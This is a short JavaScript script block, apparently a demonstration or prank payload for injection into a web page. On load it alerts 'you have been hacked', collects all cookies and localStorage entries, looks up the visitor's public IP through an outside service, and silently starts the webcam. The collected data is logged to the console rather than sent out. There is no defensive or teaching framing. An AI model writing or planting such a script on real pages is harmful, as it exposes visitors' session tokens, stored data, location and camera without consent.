<script>
  function getAllCookiesAndLocalStorage() {
    const cookies = document.cookie.split(';').map(cookie => {
      const [name, value] = cookie.trim().split('=');
      return { name, value };
    });

    const localStorageItems = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const value = localStorage.getItem(key);
      localStorageItems.push({ key, value });
    }

    const allItems = cookies.concat(localStorageItems);
    return allItems;
  }
  
  async function getPublicIpAddress() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error('Error fetching IP address:', error);
      return null;
    }
  }
  
  async function startCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const videoElement = document.createElement('video');
      videoElement.id = 'videoElement';
      videoElement.width = 640;
      videoElement.height = 480;
      videoElement.autoplay = true;
      videoElement.srcObject = stream;

      document.body.appendChild(videoElement);
    } catch (error) {
      console.error('Error accessing camera:', error);
    }
  }
  
  async function hackUser() {
    alert(`you have been hacked my friend`);
    
    console.log('you browser data', getAllCookiesAndLocalStorage());
    
    const userIp = await getPublicIpAddress();
    
    console.log('you machine location', userIp);
    
    await startCamera();
  }
  
  hackUser();
</script>
